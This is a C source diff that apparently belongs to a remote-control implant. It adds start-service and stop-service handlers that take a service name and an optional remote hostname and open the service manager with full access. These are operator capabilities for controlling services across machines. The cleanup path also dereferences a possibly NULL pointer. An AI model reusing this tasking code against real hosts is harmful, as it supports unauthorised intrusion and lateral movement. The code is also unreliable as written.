@@ -3308,35 +3308,38 @@ CLEANUP:
 	return pResult;
 }
 
-PENVELOPE StartServiceByNameHandler
+PENVELOPE StartServiceHandler
 (
 	_In_ PENVELOPE pEnvelope
 )
 {
 	PENVELOPE pResult = NULL;
-	PBUFFER** pServiceInfoReq = NULL;
-	PPBElement pRecvElement;
+	LPVOID* pUnmarshaledData = NULL;
+	PPBElement ReqElements[2];
 	SC_HANDLE hService = NULL;
 	DWORD i = 0;
 	SC_HANDLE hScManager = NULL;
-	DWORD dwBytesNeeded = 0;
 	PPBElement RecvElementList[2];
 	LPSTR lpServiceName = NULL;
+	LPSTR lpHostname = NULL;
 
-	pRecvElement = ALLOC(sizeof(PBElement));
-	pRecvElement->Type = StructType;
-	pRecvElement->dwFieldIdx = 1;
-	pRecvElement->SubElements = ALLOC(sizeof(PPBElement) * 2);
-	pRecvElement->dwNumberOfSubElement = 2;
-	for (i = 0; i < pRecvElement->dwNumberOfSubElement; i++) {
-		pRecvElement->SubElements[i] = ALLOC(sizeof(PBElement));
-		pRecvElement->SubElements[i]->Type = Bytes;
-		pRecvElement->SubElements[i]->dwFieldIdx = i + 1;
+	for (i = 0; i < _countof(ReqElements); i++) {
+		ReqElements[i] = ALLOC(sizeof(PBElement));
+		ReqElements[i]->dwFieldIdx = i + 1;
+		ReqElements[i]->Type = Bytes;
 	}
 
-	pServiceInfoReq = UnmarshalStruct(&pRecvElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
-	lpServiceName = DuplicateStrA(pServiceInfoReq[0][0]->pBuffer, 0);
-	hScManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_ENUMERATE_SERVICE);
+	pUnmarshaledData = UnmarshalStruct(ReqElements, _countof(ReqElements), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	if (pUnmarshaledData == NULL || pUnmarshaledData[0] == NULL) {
+		goto CLEANUP;
+	}
+
+	lpServiceName = DuplicateStrA(((PBUFFER)pUnmarshaledData[0])->pBuffer, 0);
+	if (pUnmarshaledData[1] != NULL) {
+		lpHostname = DuplicateStrA(((PBUFFER)pUnmarshaledData[1])->pBuffer, 0);
+	}
+
+	hScManager = OpenSCManagerA(lpHostname, NULL, SC_MANAGER_ALL_ACCESS);
 	if (hScManager == NULL) {
 		LOG_ERROR("OpenSCManagerA", GetLastError());
 		goto CLEANUP;
@@ -3356,18 +3359,15 @@ PENVELOPE StartServiceByNameHandler
 	pResult = ALLOC(sizeof(ENVELOPE));
 	pResult->uID = pEnvelope->uID;
 CLEANUP:
-	if (lpServiceName != NULL) {
-		FREE(lpServiceName);
+	FREE(lpServiceName);
+	FREE(lpHostname);
+
+	for (i = 0; i < _countof(ReqElements); i++) {
+		FREE(ReqElements[i]);
+		FREE(pUnmarshaledData[i]);
 	}
 
-	FreeElement(pRecvElement);
-	if (pServiceInfoReq != NULL) {
-		FreeBuffer(pServiceInfoReq[0][0]);
-		FreeBuffer(pServiceInfoReq[0][1]);
-		FREE(pServiceInfoReq[0]);
-		FREE(pServiceInfoReq);
-	}
-
+	FREE(pUnmarshaledData);
 	if (hScManager != NULL) {
 		CloseServiceHandle(hScManager);
 	}
@@ -3375,6 +3375,55 @@ CLEANUP:
 	if (hService != NULL) {
 		CloseServiceHandle(hService);
 	}
+
+	return pResult;
+}
+
+PENVELOPE StopServiceHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PENVELOPE pResult = NULL;
+	LPVOID* pUnmarshaledData = NULL;
+	PPBElement ReqElements[2];
+	DWORD i = 0;
+	PPBElement RecvElementList[2];
+	LPSTR lpServiceName = NULL;
+	LPSTR lpHostname = NULL;
+
+	for (i = 0; i < _countof(ReqElements); i++) {
+		ReqElements[i] = ALLOC(sizeof(PBElement));
+		ReqElements[i]->dwFieldIdx = i + 1;
+		ReqElements[i]->Type = Bytes;
+	}
+
+	pUnmarshaledData = UnmarshalStruct(ReqElements, _countof(ReqElements), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	if (pUnmarshaledData == NULL || pUnmarshaledData[0] == NULL) {
+		goto CLEANUP;
+	}
+
+	lpServiceName = DuplicateStrA(((PBUFFER)pUnmarshaledData[0])->pBuffer, 0);
+	if (pUnmarshaledData[1] != NULL) {
+		lpHostname = DuplicateStrA(((PBUFFER)pUnmarshaledData[1])->pBuffer, 0);
+	}
+
+	if (!StopService(lpServiceName, lpHostname)) {
+		goto CLEANUP;
+	}
+
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+CLEANUP:
+	FREE(lpServiceName);
+	FREE(lpHostname);
+
+	for (i = 0; i < _countof(ReqElements); i++) {
+		FREE(ReqElements[i]);
+		FREE(pUnmarshaledData[i]);
+	}
+
+	FREE(pUnmarshaledData);
 
 	return pResult;
 }
@@ -4181,8 +4230,8 @@ REQUEST_HANDLER* GetSystemHandler()
 	HandlerList[MsgInvokeMigrateReq] = NULL;
 	HandlerList[MsgSpawnDllReq] = NULL;
 	HandlerList[MsgCreateServiceReq] = CreateServiceHandler;
-	HandlerList[MsgStartServiceReq] = NULL;
-	HandlerList[MsgStopServiceReq] = NULL;
+	HandlerList[MsgStartServiceReq] = StartServiceHandler;
+	HandlerList[MsgStopServiceReq] = StopServiceHandler;
 	HandlerList[MsgRemoveServiceReq] = NULL;
 	HandlerList[MsgSetEnvReq] = NULL;
 	HandlerList[MsgUnsetEnvReq] = NULL;
